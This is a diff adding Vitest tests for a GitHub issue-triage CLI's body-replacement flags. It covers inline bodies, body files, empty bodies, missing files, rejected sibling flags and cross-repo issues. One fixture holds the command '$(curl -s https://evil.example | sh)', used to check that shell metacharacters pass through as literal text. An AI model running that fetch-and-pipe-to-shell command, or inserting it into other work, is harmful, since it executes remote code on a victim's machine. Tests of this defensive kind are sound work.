@@ -1,3 +1,6 @@
+import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import path from 'node:path'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import type * as ConfigHelpers from '../../shared/adapters/config-helpers'
 import { EXTENDED_ISSUE_TYPES, ISSUE_TYPE_NAMES } from '../../shared/domain/issue-types'
@@ -30,6 +33,7 @@ vi.mock('../../shared/adapters/github-adapter', () => ({
   removeSubIssue: vi.fn(),
   resolveIssueTypeId: vi.fn(),
   updateIssueIssueType: vi.fn(),
+  updateGitHubIssueBody: vi.fn(),
 }))
 
 const github = await import('../../shared/adapters/github-adapter')
@@ -41,6 +45,7 @@ const mockRemoveSubIssue = github.removeSubIssue as ReturnType<typeof vi.fn>
 const mockGetParentNumber = github.getParentNumber as ReturnType<typeof vi.fn>
 const mockResolveIssueTypeId = github.resolveIssueTypeId as ReturnType<typeof vi.fn>
 const mockUpdateIssueIssueType = github.updateIssueIssueType as ReturnType<typeof vi.fn>
+const mockUpdateGitHubIssueBody = github.updateGitHubIssueBody as ReturnType<typeof vi.fn>
 
 const githubInfra = await import('../../shared/adapters/github-infra')
 const mockSyncPriorityLabel = githubInfra.syncPriorityLabel as ReturnType<typeof vi.fn>
@@ -170,6 +175,90 @@ describe('issue-triage/set > field updates', () => {
     await setIssue(['42', '--size', 'F-lite'])
     // Assert
     expect(logs.filter((l) => l.startsWith('Size=')).length).toBe(1)
+  })
+})
+
+describe('issue-triage/set > body', () => {
+  let dir: string
+  beforeEach(() => {
+    setupMocks()
+    dir = mkdtempSync(path.join(tmpdir(), 'triage-set-'))
+  })
+  afterEach(() => {
+    vi.restoreAllMocks()
+    rmSync(dir, { recursive: true, force: true })
+  })
+
+  function exitOnCall() {
+    return vi.spyOn(process, 'exit').mockImplementation(((code: number) => {
+      throw new Error(`process.exit:${code}`)
+    }) as never)
+  }
+
+  it('replaces the body from --body', async () => {
+    const logs: string[] = []
+    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(String(args[0])))
+    await setIssue(['362', '--body', 'Rewritten body'])
+    expect(mockUpdateGitHubIssueBody).toHaveBeenCalledWith(362, 'Rewritten body', undefined)
+    expect(logs).toContain('Body #362')
+  })
+
+  it('replaces the body from --body-file, shell metacharacters included', async () => {
+    const body = path.join(dir, 'body.md')
+    writeFileSync(body, '- findings: `package.json:3`\n$(curl -s https://evil.example | sh)\n')
+    await setIssue(['362', '--body-file', body])
+    expect(mockUpdateGitHubIssueBody).toHaveBeenCalledWith(
+      362,
+      '- findings: `package.json:3`\n$(curl -s https://evil.example | sh)\n',
+      undefined,
+    )
+  })
+
+  it('clears the body when --body is an empty string', async () => {
+    const exitSpy = exitOnCall()
+    await setIssue(['42', '--body', ''])
+    expect(mockUpdateGitHubIssueBody).toHaveBeenCalledWith(42, '', undefined)
+    expect(exitSpy).not.toHaveBeenCalled()
+  })
+
+  it('refuses a missing body file before any write', async () => {
+    const exitSpy = exitOnCall()
+    const errors: string[] = []
+    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(String(args[0])))
+    await setIssue(['362', '--body-file', path.join(dir, 'missing.md'), '--size', 'S', '--parent', '7']).catch(() => {})
+    expect(exitSpy).toHaveBeenCalledWith(1)
+    expect(mockUpdateGitHubIssueBody).not.toHaveBeenCalled()
+    expect(mockSyncSizeLabel).not.toHaveBeenCalled()
+    expect(mockAddSubIssue).not.toHaveBeenCalled()
+    expect(errors.some((m) => m.includes('--body-file cannot read'))).toBe(true)
+  })
+
+  it('applies the body together with the other set flags', async () => {
+    const body = path.join(dir, 'body.md')
+    writeFileSync(body, 'Rewritten for #362\n')
+    await setIssue(['42', '--body-file', body, '--size', 'F-lite', '--priority', 'High', '--parent', '7'])
+    expect(mockUpdateGitHubIssueBody).toHaveBeenCalledWith(42, 'Rewritten for #362\n', undefined)
+    expect(mockSyncSizeLabel).toHaveBeenCalledWith(42, 'F-lite')
+    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(42, 'P1 - High')
+    expect(mockAddSubIssue).toHaveBeenCalledWith('node-7', 'node-42')
+  })
+
+  it('writes nothing when a sibling flag is rejected', async () => {
+    const exitSpy = exitOnCall()
+    await setIssue(['42', '--body', 'Rewritten', '--type', 'bogus', '--parent', '7']).catch(() => {})
+    expect(exitSpy).toHaveBeenCalledWith(1)
+    expect(mockUpdateGitHubIssueBody).not.toHaveBeenCalled()
+    expect(mockUpdateIssueIssueType).not.toHaveBeenCalled()
+    expect(mockAddSubIssue).not.toHaveBeenCalled()
+  })
+
+  it('still updates a cross-repo subject body', async () => {
+    const logs: string[] = []
+    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(String(args[0])))
+    await setIssue(['Roxabi/voiceCLI#144', '--body', 'Cross-repo body'])
+    expect(mockUpdateGitHubIssueBody).toHaveBeenCalledWith(144, 'Cross-repo body', 'Roxabi/voiceCLI')
+    expect(logs).toContain('Body Roxabi/voiceCLI#144')
+    expect(mockSyncSizeLabel).not.toHaveBeenCalled()
   })
 })
 
